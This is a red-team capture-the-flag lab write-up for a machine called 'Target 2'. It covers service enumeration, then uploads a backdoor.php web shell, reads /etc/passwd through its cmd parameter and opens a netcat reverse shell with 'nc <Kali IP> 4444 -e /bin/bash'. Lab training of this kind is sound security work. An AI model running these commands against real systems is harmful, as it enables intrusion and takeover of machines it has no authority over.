# Red Team: Summary of Operations for Target 2 machine

## Table of Contents
- Exposed Services
- Enumeratuion with nikto
- Enumeration with gobuster
- Exploitation

### Exposed Services

Nmap scan results for Target 2 machine reveal the below services and OS details:
``` bash
$ nmap -sV 192.168.1.0/24
```
  ![](Images/Target%202%20IP%20address.png)
  ![](Images/Target%202%20exposed%20ports%20and%20services.png)

This scan identifies the services below as potential points of entry:
- Target 1
  - List of Exposed Services
    o	http
    o	rcpbind
    o	netbios-snn (Samba smbd 3.X-4.X)
    o	ssh


Enumeratuion with nikto:
- Enumerating the web server with nikto.
- Command run: nikto -C all -h 192.168.1.115
- This website is running an Apache 2.4.10 web server which is outdated.

  ![](Images/Target%202%20nikto%20enumeration.png)

Enumeration with gobuster:
- Performing a more in-depth enumeration with gobuster
- First installing the tool gobuster using apt.

  ![](Images/Target%202%20gobuster%20install.png)

- Running gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u 192.168.1.115

  ![](Images/Target%202%20gobuster%20enumeration.png)

- Searched 192.168.1.115 in web browser and found flag 1 in the PATH directory in the exposed index directory of this web server

  ![](Images/Target%202%20flag%201.png)



### Exploitation

- Use the provided script exploit.sh to exploit this vulnerability by opening an Ncat connection to your Kali VM.
- ![](exploit.txt)
- Run the script. It uploads a file called backdoor.php to the target server. This file can be used to execute command injection attacks.

  ![](Images/Target%202%20script%20execute.png)

- Navigate to: http://<Target 2 URL>/backdoor.php?cmd=<CMD>
- This allows you to run bash commands on Target 2.
- For example, try: http://<Target 2 URL>/backdoor.php?cmd=cat%20/etc/passwd 

  ![](Images/Target%202%20script%20exploit%20success.png)

- Next, use the backdoor to open a shell session on the target.
- On attacker Kali VM, start a netcat listener: nc -lnvp 4444 
- In the browser, use the backdoor to run: nc <Kali IP> 4444 -e /bin/bash. For example, query string will look like cmd=nc%20<Kali IP>%204444%20-e%20/bin/bash.

  ![](Images/Target%202%20ncat%20listener%20on%20Kali.png)
  ![](Images/Target%202%20ncat%20established%20connection%20on%20target.png)

- Using the shell that was opened on Target 2, find a flag in /var/www.

  ![](Images/Target%202%20flag%202.png)

- Next, finding a flag in the WordPress uploads directory.

  ![](Images/Target%202%20flag%203.png)

- If you find all three flags -- congratulations! There is a fourth, but escalating to root is extremely difficult:


